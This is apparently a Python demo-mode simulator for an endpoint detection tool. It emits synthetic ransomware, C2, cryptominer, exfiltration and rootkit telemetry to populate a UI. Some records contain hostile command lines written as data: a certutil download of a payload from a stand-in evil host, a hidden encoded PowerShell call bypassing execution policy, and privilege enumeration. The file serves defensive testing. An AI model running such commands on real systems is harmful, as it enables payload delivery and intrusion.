"""
Demo mode threat simulator.
Generates realistic telemetry that flows through the full detection pipeline:
  sensor telemetry → heuristics → analysis → response → archive → UI
"""

import threading
import time
import random
from python.core.logger import get_logger

logger = get_logger('demo')

# Each scenario produces telemetry that triggers a specific heuristic rule,
# ensuring the event reaches the UI even with untrained ML models.
SCENARIOS = [
    {
        'label': 'Ransomware — mass file encryption',
        'delay': (8, 14),
        'telemetry': {
            'source':        'file',
            'event':         'mass_file_modification',
            'count':         34,
            'severity_hint': 10,
            'attack_hint':   'ransomware',
            'file_path':     '/Users/Shared/Documents/report_2024.docx',
            'extension':     '.docx',
            'is_sensitive':  True,
        },
    },
    {
        'label': 'Ransomware — extension renamed to .locked',
        'delay': (10, 18),
        'telemetry': {
            'source':        'file',
            'event':         'ransomware_extension_detected',
            'src':           '/Users/Shared/Documents/financials.xlsx',
            'dest':          '/Users/Shared/Documents/financials.xlsx.locked',
            'severity_hint': 9,
            'attack_hint':   'ransomware',
            'file_path':     '/Users/Shared/Documents/financials.xlsx',
            'is_sensitive':  True,
        },
    },
    {
        'label': 'C2 Beacon — repeated connections to suspicious host',
        'delay': (9, 15),
        'telemetry': {
            'source':        'network',
            'event':         'beacon_pattern',
            'dest_ip':       '185.220.101.47',
            'dest_port':     4444,
            'frequency':     14,
            'packet_size':   64,
            'severity_hint': 6,
            'attack_hint':   'c2_beacon',
            'pid':           4821,
            'name':          'chrome',
        },
    },
    {
        'label': 'C2 Beacon — suspicious port connection',
        'delay': (12, 20),
        'telemetry': {
            'source':        'network',
            'event':         'suspicious_port_connection',
            'dest_ip':       '91.108.4.12',
            'dest_port':     1337,
            'pid':           3192,
            'severity_hint': 7,
            'name':          'python3',
        },
    },
    {
        'label': 'PowerShell — encoded command execution',
        'delay': (11, 17),
        'telemetry': {
            'source':   'process',
            'event':    'high_risk_process',
            'pid':      7741,
            'name':     'powershell.exe',
            'cmdline':  [
                'powershell.exe', '-WindowStyle', 'Hidden',
                '-EncodedCommand', 'JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=',
                '-ExecutionPolicy', 'Bypass',
            ],
            'cpu':      12.4,
            'memory':   3.1,
        },
    },
    {
        'label': 'LOLBin — certutil downloading payload',
        'delay': (13, 22),
        'telemetry': {
            'source':   'process',
            'event':    'high_risk_process',
            'pid':      5530,
            'name':     'certutil',
            'cmdline':  ['certutil', '-urlcache', '-split', '-f',
                         'http://evil.example.com/payload.exe', 'C:\\Temp\\p.exe'],
            'cpu':      2.1,
            'memory':   0.8,
        },
    },
    {
        'label': 'Cryptominer — sustained CPU spike',
        'delay': (15, 25),
        'telemetry': {
            'source':        'process',
            'event':         'resource_spike',
            'pid':           9123,
            'name':          'xmrig',
            'cpu':           97.2,
            'memory':        4.8,
            'connections':   3,
            'attack_hint':   'cryptominer',
            'severity_hint': 5,
        },
    },
    {
        'label': 'Privilege escalation — token impersonation attempt',
        'delay': (10, 16),
        'telemetry': {
            'source':   'process',
            'event':    'high_risk_process',
            'pid':      6612,
            'name':     'cmd.exe',
            'cmdline':  ['cmd.exe', '/c', 'whoami /priv',
                         '&&', 'net', 'localgroup', 'administrators'],
            'cpu':      0.4,
            'memory':   0.2,
        },
    },
    {
        'label': 'Data exfiltration — large outbound transfer',
        'delay': (14, 22),
        'telemetry': {
            'source':        'network',
            'event':         'new_connection',
            'dest_ip':       '104.21.88.23',
            'dest_port':     443,
            'packet_size':   58400,
            'pid':           2201,
            'name':          'node',
            'attack_hint':   'data_exfil',
            'severity_hint': 7,
        },
    },
    {
        'label': 'Rootkit — writable+executable memory region',
        'delay': (16, 26),
        'telemetry': {
            'source':        'memory',
            'event':         'wx_memory_region',
            'pid':           1188,
            'name':          'svchost.exe',
            'region':        'anonymous',
            'severity_hint': 6,
        },
    },
]


class ThreatSimulator:
    def __init__(self, on_telemetry):
        self.on_telemetry = on_telemetry
        self.running = False
        self._threads = []

    def start(self):
        self.running = True
        logger.info('Demo mode active — threat simulator started')

        # Fire first 3 scenarios immediately (2s, 5s, 8s) so UI fills fast
        threading.Thread(target=self._fire_first, daemon=True).start()

        # Each scenario runs its own loop with short stagger
        for scenario in SCENARIOS:
            t = threading.Thread(
                target=self._scenario_loop,
                args=(scenario,),
                daemon=True,
            )
            t.start()
            self._threads.append(t)

    def stop(self):
        self.running = False

    def _fire_first(self):
        """Fire the first 3 scenarios quickly so the UI fills up immediately."""
        for i, scenario in enumerate(SCENARIOS[:3]):
            time.sleep(2 + i * 3)
            if self.running:
                self.on_telemetry(dict(scenario['telemetry']))

    def _scenario_loop(self, scenario):
        lo, hi = scenario['delay']
        # Short stagger so all 10 scenarios start within ~20 s
        time.sleep(random.uniform(2, 8))

        while self.running:
            try:
                telemetry = dict(scenario['telemetry'])
                # Add slight jitter to numeric fields so each event looks unique
                if 'cpu' in telemetry:
                    telemetry['cpu'] = round(telemetry['cpu'] + random.uniform(-5, 5), 1)
                if 'packet_size' in telemetry:
                    telemetry['packet_size'] = int(telemetry['packet_size'] * random.uniform(0.8, 1.2))
                if 'count' in telemetry:
                    telemetry['count'] = telemetry['count'] + random.randint(-4, 8)

                self.on_telemetry(telemetry)
                logger.info(f'[DEMO] fired: {scenario["label"]}')
            except Exception as e:
                logger.error(f'[DEMO] scenario error: {e}')

            time.sleep(random.uniform(lo, hi))
